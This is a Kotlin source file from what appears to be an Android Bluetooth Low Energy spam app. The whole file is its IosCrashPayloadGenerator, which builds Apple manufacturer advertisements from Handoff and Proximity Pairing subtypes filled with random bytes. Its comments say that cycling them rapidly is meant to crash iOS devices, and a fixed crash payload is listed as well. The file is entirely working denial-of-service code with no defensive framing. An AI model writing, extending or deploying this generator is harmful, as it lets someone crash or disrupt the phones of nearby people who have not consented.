package com.example.ble.data

import kotlin.random.Random

/**
 * Generates randomized Apple iOS crash payloads.
 * Uses Handoff (0x0F) and Proximity Pairing (0x07) subtypes with random bytes
 * to stress iOS's BLE parsing. Cycling these rapidly can trigger crashes on
 * older iOS versions. Labeled "Experimental - may not work on iOS 18+".
 */
object IosCrashPayloadGenerator {

    private val APPLE_COMPANY_ID = 0x004C

    fun generateHandoffPayload(): BlePayload {
        val randomLength = Random.nextInt(5, 20)
        val randomBytes = ByteArray(randomLength) { Random.nextInt(0, 256).toByte() }
        val data = byteArrayOf(0x0F, randomLength.toByte()) + randomBytes

        return BlePayload(
            id = "ios_crash_handoff_${System.currentTimeMillis()}",
            name = "iOS Crash (Experimental - may not work on iOS 18+)",
            category = PayloadCategory.IOS_CRASH,
            manufacturerData = ManufacturerData(
                companyId = APPLE_COMPANY_ID,
                data = data
            )
        )
    }

    fun generateProximityPairingPayload(): BlePayload {
        val randomModelBytes = ByteArray(2) { Random.nextInt(0, 256).toByte() }
        val randomTrailing = ByteArray(25) { Random.nextInt(0, 256).toByte() }
        val data = byteArrayOf(0x07, 0x19) + randomModelBytes + randomTrailing

        return BlePayload(
            id = "ios_crash_proximity_${System.currentTimeMillis()}",
            name = "iOS Crash (Experimental - may not work on iOS 18+)",
            category = PayloadCategory.IOS_CRASH,
            manufacturerData = ManufacturerData(
                companyId = APPLE_COMPANY_ID,
                data = data
            )
        )
    }

    /** Returns a new randomized crash payload cycling between Handoff and Proximity Pairing. */
    fun nextPayload(index: Int): BlePayload {
        return if (index % 2 == 0) generateHandoffPayload() else generateProximityPairingPayload()
    }
}

val IOS_CRASH_PAYLOADS: List<BlePayload> = listOf(
    BlePayload(
        id = "ios_crash_experimental",
        name = "iOS Crash (Experimental - may not work on iOS 18+)",
        category = PayloadCategory.IOS_CRASH,
        manufacturerData = ManufacturerData(
            companyId = 0x004C,
            data = byteArrayOf(0x0F, 0x05, 0x00, 0x00, 0x10, 0x00, 0x00)
        ),
        description = "Rapidly cycles randomized Apple proximity pairing payloads"
    )
)
